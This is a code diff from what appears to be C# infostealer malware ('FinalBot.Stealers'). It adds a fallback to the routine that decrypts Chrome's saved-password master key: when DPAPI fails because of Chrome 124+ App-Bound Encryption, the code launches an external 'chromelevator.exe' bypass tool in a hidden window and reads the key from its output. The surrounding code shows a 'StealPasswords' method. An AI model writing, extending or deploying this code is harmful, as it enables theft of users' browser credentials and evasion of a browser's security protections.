@@ -104,9 +104,62 @@ namespace FinalBot.Stealers
                 byte[] keyWithPrefix = Convert.FromBase64String(encryptedKey);
                 byte[] key = keyWithPrefix.Skip(5).ToArray(); // Remove 'DPAPI' prefix
 
-                return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
+                try 
+                {
+                    // Attempt standard DPAPI unprotect
+                    return ProtectedData.Unprotect(key, null, DataProtectionScope.CurrentUser);
+                }
+                catch (CryptographicException)
+                {
+                    // ABE (App-Bound Encryption) trigger for Chrome 124+
+                    Logger.Warn("App-Bound Encryption detected. Attempting Chromelevator bypass...");
+                    return RunChromelevator(rootPath);
+                }
             }
-            catch { return null; }
+            catch (Exception ex)
+            { 
+                Logger.Error("Failed to parse Local State", ex);
+                return null; 
+            }
+        }
+
+        private byte[] RunChromelevator(string profilePath)
+        {
+            try
+            {
+                string elevatorPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "chromelevator.exe");
+                if (!File.Exists(elevatorPath)) 
+                {
+                    Logger.Warn("chromelevator.exe not found! Cannot bypass Chrome 124+ ABE.");
+                    return null;
+                }
+
+                // Call the external ABE bypass tool and read its output
+                var proc = new System.Diagnostics.Process
+                {
+                    StartInfo = new System.Diagnostics.ProcessStartInfo
+                    {
+                        FileName = elevatorPath,
+                        Arguments = $"\"{profilePath}\"",
+                        UseShellExecute = false,
+                        RedirectStandardOutput = true,
+                        CreateNoWindow = true
+                    }
+                };
+                proc.Start();
+                string output = proc.StandardOutput.ReadToEnd().Trim();
+                proc.WaitForExit();
+
+                if (!string.IsNullOrEmpty(output))
+                {
+                    return Convert.FromBase64String(output);
+                }
+            }
+            catch (Exception ex)
+            {
+                Logger.Error("Chromelevator execution failed", ex);
+            }
+            return null;
         }
 
         private async Task<int> StealPasswords(string dbPath, byte[] masterKey, StringBuilder report)
